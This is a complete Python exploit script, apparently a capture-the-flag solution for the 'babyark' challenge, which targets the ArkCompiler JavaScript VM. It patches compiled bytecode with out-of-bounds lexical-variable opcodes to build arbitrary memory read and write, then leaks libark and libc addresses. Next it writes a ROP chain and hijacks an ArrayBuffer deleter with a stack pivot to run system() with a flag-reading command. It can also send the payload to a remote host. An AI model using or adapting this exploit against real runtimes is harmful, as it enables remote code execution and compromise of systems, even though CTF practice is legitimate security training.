#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
babyark exploit (2026 强网杯) —— 自己构造恶意 .abc 字节码。

漏洞（题解第 2 节）：解释器不做任何字节码校验，ldlexvar/stlexvar 的 slot 直接从
指令立即数里读，TaggedArray::Get 的越界检查只存在于 ASSERT（release 被裁掉）：
        slot_addr = env + 40 + 8*slot
短指令形式 slot 为 8 位（0x8a/0x8b），wide 形式可达 65535，窗口约 512KB。

利用：用 es2abc 编译模板，再把 4 个"探针"函数体整段替换成越界读写原语：
        p0: ldlexvar 0,5  ; stlexvar 0,14 ; return   # scr 的 ByteArray 指针 -> scratch
        p1: ldlexvar 0,14 ; stlexvar 0,82 ; return   # scratch -> ab.data
        p2: ldlexvar 0,92 ; stlexvar 0,14 ; return   # addrof(ab)
        p3: lda v4        ; stlexvar 0,14 ; return   # addrof(任意 JS 值)
把 ab.data 指向 scratch 里的假 JSNativePointer（+8 = externalPointer），u8 就变成
8 字节粒度的任意地址读写器；随后
  读 vic 的 JSNativePointer -> deleter(FreeBufferFunc) 得 libark -> GOT execv 得 libc
  -> 在 vic 的 native 缓冲布置 ROP，把 deleter 改成 mov rsp, rdx; ret，data 指向 ROP
  -> VM 析构时 deleter(env, externalPointer, data) 完成栈迁移 -> system(cmd)

用法：
    python exp.py --es2abc /path/to/es2abc --vm ./ark_js_vm --libdir ./lib
    python exp.py TARGET_HOST PORT          # 远端：把打补丁后的 abc 发过去
"""
import argparse
import os
import struct
import subprocess
import sys
import tempfile

from pwn import context, log, process, remote

context.log_level = 'info'

TARGET_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999

# ---------------------------------------------------------------- 常量（题解常量表）
SLOT_SCR_OBJ = 5
SLOT_SCR_DATA = 14
SLOT_AB_DATA = 82
SLOT_AB_OBJ = 92

FREE_BUFFER_FUNC = 0x2504B40
GOT_EXECV = 0x2ACBBF8
GOT_FREE = 0x2AC07F8

LIBC_SYSTEM = 0x58750
LIBC_EXECV = 0xEF010
LIBC_FREE = 0xADE30
LIBC_POP_RDI = 0x10C08D
LIBC_RET = 0x28A92
LIBC_MOV_RSP_RDX = 0x5EF6F

CMD = ("cat /flag* /home/*/flag* /root/flag* 2>/dev/null;"
       "find / -maxdepth 5 -iname 'flag*' -type f -exec cat {} + 2>/dev/null|head -c 3000")

JS_TEMPLATE = r'''
var G_SCR, G_AB, G_U8, G_VIC;
function outer() {
  let secret = 111;                       // 被闭包捕获，强制生成 LexicalEnv
  let scr = new Uint8Array(0x200);        // 堆内 ByteArray，数据内联（scratch）
  let ab  = new ArrayBuffer(0x100);       // 被伪造 data 的对象
  let u8  = new Uint8Array(ab);           // 之后变成任意地址读写器
  let vic = new ArrayBuffer(0x100);       // 析构回调的 victim
  G_SCR = scr; G_AB = ab; G_U8 = u8; G_VIC = vic;
  let p0 = function p0(){ return secret; };
  let p1 = function p1(){ return secret; };
  let p2 = function p2(){ return secret; };
  let p3 = function p3(x){ let t = 1; t = t + 2; t = t + 3; return x; };
  return [p0, p1, p2, p3];
}
let ps = outer(), p0 = ps[0], p1 = ps[1], p2 = ps[2], p3 = ps[3];
let scr = G_SCR, ab = G_AB, u8 = G_U8, vic = G_VIC;

function rd(o){let v=0,m=1;for(let i=0;i<8;i++){v=v+scr[o+i]*m;m=m*256;}return v;}
function wr(o,v){let m=1;for(let i=0;i<8;i++){scr[o+i]=Math.floor(v/m)%256;m=m*256;}}
function rdu(o){let v=0,m=1;for(let i=0;i<8;i++){v=v+u8[o+i]*m;m=m*256;}return v;}
function wru(o,v){let m=1;for(let i=0;i<8;i++){u8[o+i]=Math.floor(v/m)%256;m=m*256;}}

p0(); let B = rd(0); let D = B + 16;              // scr 的 ByteArray / 伪造 NP 的地址
p3(ab); let Aab = rd(0); p3(vic); let Avic = rd(0);
wr(0, D); wr(8, Aab); p1();                       // ab.data = fakeNP(D)，externalPointer = Aab

wr(8, Avic); let vicNP = rdu(32);                 // vic 的 JSNativePointer
wr(8, vicNP); let vicExt = rdu(8), vicDel = rdu(16);
let libark = vicDel - 0x2504b40;                  // FreeBufferFunc
wr(8, libark + 0x2acbbf8); let execvG = rdu(0);   // execv@got
let libc = execvG - 0xef010;
if (libc % 0x1000 != 0) { wr(8, libark + 0x2ac07f8); libc = rdu(0) - 0xade30; }

// 在 vic 的 native 缓冲里布置 ROP：system("cat /flag* ...")
let CB = vicExt, chainOff = 0x00, cmdOff = 0x40;
let popRdi = libc + 0x10c08d, alignRet = libc + 0x28a92, system = libc + 0x58750;

wr(8, CB);                                        // u8 窗口 -> CB
let cmdStr = "cat /flag* /home/*/flag* /root/flag* 2>/dev/null;" +
             "find / -maxdepth 5 -iname 'flag*' -type f -exec cat {} + 2>/dev/null|head -c 3000";
for (let i = 0; i < cmdStr.length; i++) wru(cmdOff + i, cmdStr.charCodeAt(i) & 0xff);
wru(cmdOff + cmdStr.length, 0);

let chain = [popRdi, CB + cmdOff];
if (((CB + 0x20) % 16) === 8) chain.push(alignRet);   // 保证进入 system 时 16 字节对齐
chain.push(system);
for (let i = 0; i < chain.length; i++) wru(chainOff + 8 * i, chain[i]);

// hijack：externalPointer / deleter / data
wr(8, vicNP);                                     // 窗口 -> NP
wru(8, CB);                                       // externalPointer（本路径无实际作用）
wru(16, libc + 0x5ef6f);                          // deleter = mov rsp, rdx; ret
wru(24, CB);                                      // data = ROP 链，落在 rdx

// 兼容带该断言钩子的宿主；不抛异常，保证析构链能走到 ClearNativePointerList
if (typeof test_end === "function") test_end();
'''


# ---------------------------------------------------------------- 字节码补丁
def _u8(x):
    return bytes([x & 0xff])


def patch_body(data, start, patch):
    """从 start 起覆盖到原指令流的 return(0x64) 为止，长度必须 >= patch。"""
    end = data.index(0x64, start)
    length = end - start + 1
    if length < len(patch):
        raise RuntimeError("patch (%dB) does not fit probe body (%dB) @ %#x"
                           % (len(patch), length, start))
    out = bytearray(data)
    out[start:start + len(patch)] = patch
    for i in range(start + len(patch), end + 1):
        out[i] = 0x64                     # 多余的槽位填 return，不会被走到
    return bytes(out)


def patch_abc(abc):
    # p0/p1/p2 原体以 ldlexvar 0,0 ; sta v0 开头
    p0 = bytes([0x8a, 0x00, SLOT_SCR_OBJ, 0x8b, 0x00, SLOT_SCR_DATA, 0x64])
    p1 = bytes([0x8a, 0x00, SLOT_SCR_DATA, 0x8b, 0x00, SLOT_AB_DATA, 0x64])
    p2 = bytes([0x8a, 0x00, SLOT_AB_OBJ, 0x8b, 0x00, SLOT_SCR_DATA, 0x64])
    p3 = bytes([0x60, 0x04, 0x8b, 0x00, SLOT_SCR_DATA, 0x64])   # lda v4; stlexvar 0,14

    head = bytes([0x3c, 0x00, 0x61, 0x00])          # ldlexvar 0,0 ; sta v0
    starts = []
    pos = 0
    while len(starts) < 3:
        pos = abc.find(head, pos)
        if pos < 0:
            raise RuntimeError("probe p0/p1/p2 body not found")
        starts.append(pos)
        pos += 1

    tail_sig = bytes([0x62, 0x01, 0x00, 0x00, 0x00, 0x61, 0x00, 0x62, 0x02])
    p3_pos = abc.find(tail_sig)
    if p3_pos < 0:
        raise RuntimeError("probe p3 body not found")

    data = abc
    for start, body in zip(starts, (p0, p1, p2)):
        data = patch_body(data, start, body)
    data = patch_body(data, p3_pos, p3)
    return data


# ---------------------------------------------------------------- 编译 / 运行
def compile_abc(es2abc, src_path, out_path):
    cmd = [es2abc, src_path, "--output", out_path]
    log.info("running: %s" % " ".join(cmd))
    subprocess.check_call(cmd)


def main():
    ap = argparse.ArgumentParser(description="babyark exploit")
    ap.add_argument("host", nargs="?", default=None)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("--es2abc", default=os.environ.get("ES2ABC", "es2abc"))
    ap.add_argument("--vm", default="./ark_js_vm")
    ap.add_argument("--libdir", default="./lib")
    ap.add_argument("--abc", default=None, help="复用已有的模板 abc（仍会打补丁）")
    args = ap.parse_args()

    if args.abc:
        with open(args.abc, "rb") as f:
            abc = f.read()
    else:
        tmpdir = tempfile.mkdtemp(prefix="babyark_")
        js_path = os.path.join(tmpdir, "template.js")
        abc_path = os.path.join(tmpdir, "template.abc")
        with open(js_path, "w", encoding="utf-8") as f:
            f.write(JS_TEMPLATE + "\n")
        compile_abc(args.es2abc, js_path, abc_path)
        with open(abc_path, "rb") as f:
            abc = f.read()

    patched = patch_abc(abc)
    log.success("abc patched: %d -> %d bytes" % (len(abc), len(patched)))

    tmpdir = tempfile.mkdtemp(prefix="babyark_p_")
    out_abc = os.path.join(tmpdir, "pwn.abc")
    with open(out_abc, "wb") as f:
        f.write(patched)

    env = dict(os.environ)
    env["LD_LIBRARY_PATH"] = args.libdir + ":" + env.get("LD_LIBRARY_PATH", "")

    if args.host:
        io = remote(args.host, args.port)
        io.send(patched)
        io.shutdown("send")
        out = io.recvall(timeout=15)
        io.close()
    else:
        io = process([args.vm, out_abc], env=env)
        out = io.recvall(timeout=20)
        io.close()

    text = out.decode("latin-1", "replace")
    idx = text.find("flag{")
    if idx >= 0:
        end = text.find("}", idx)
        print("[+] FLAG:", text[idx:end + 1])
    else:
        print(text[-4000:])


if __name__ == "__main__":
    main()
